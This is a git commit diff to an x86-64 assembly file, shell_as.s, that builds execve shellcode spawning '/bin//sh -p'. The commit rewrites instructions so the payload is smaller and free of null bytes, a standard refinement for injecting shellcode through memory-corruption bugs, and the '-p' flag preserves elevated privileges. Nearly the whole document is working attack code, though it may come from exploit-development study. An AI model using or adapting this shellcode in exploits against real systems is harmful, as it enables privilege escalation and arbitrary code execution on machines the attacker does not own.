07b09f7da445eff2eb16b091968da8fe265b0112
Mohamad Alhamwi <49732230+Mohamad-Alhamwi@users.noreply.github.com>
2024-09-01 20:17:06 +0300

    Update shell_as.s
    This commit reduces the size of the payload and completely eliminates null values.

--- shell_as.s
+++ shell_as.s
@@ -10,22 +10,25 @@ _start:
         push rax                            # Push some nulls for string termination.
         mov  rcx, 0x68732F2f6e69622F        # Construct "/bin//sh".
         push rcx                            # Push "/bin//sh" to the stack.
+        push rsp
         xor  rdi, rdi                       # Set up rdi.
-        mov  rdi, rsp                       # Pointer to /bin//sh.
+        pop  rdi                            # Pointer to /bin//sh.
 
         # Construct the argv array.
         push rax                            # Push some nulls for string termination.
         xor rcx, rcx                        # Set up rcx.
-        push 0x702d                         # Push "-p".
-        mov rcx, rsp                        # Rcx now points to the "-p" string.
+        push rsp
+        pop rcx
+        add word ptr [rcx], 0x702d          # Rcx now points to the "-p" string.
 
         push rax                            # Null-terminate the argv array.
         push rcx                            # Push the address of "-p" onto the stack.
         push rdi                            # Push the address of "/bin//sh" onto the stack.
+        push rsp
         xor  rsi, rsi                       # Set up rsi.
-        mov rsi, rsp                        # Rsi now points to the argument array.
+        pop rsi                             # Rsi now points to the argument array.
 
-        xor  rdx, rdx                       # NULL (An empty array for envp) (Linux accepts NULL instead of a pointer to NULL).
+        cdq                                 # NULL (An empty array for envp) (Linux accepts NULL instead of a pointer to NULL).
 
         mov al, 59                          # execve("/bin/sh", argv, envp).
         syscall
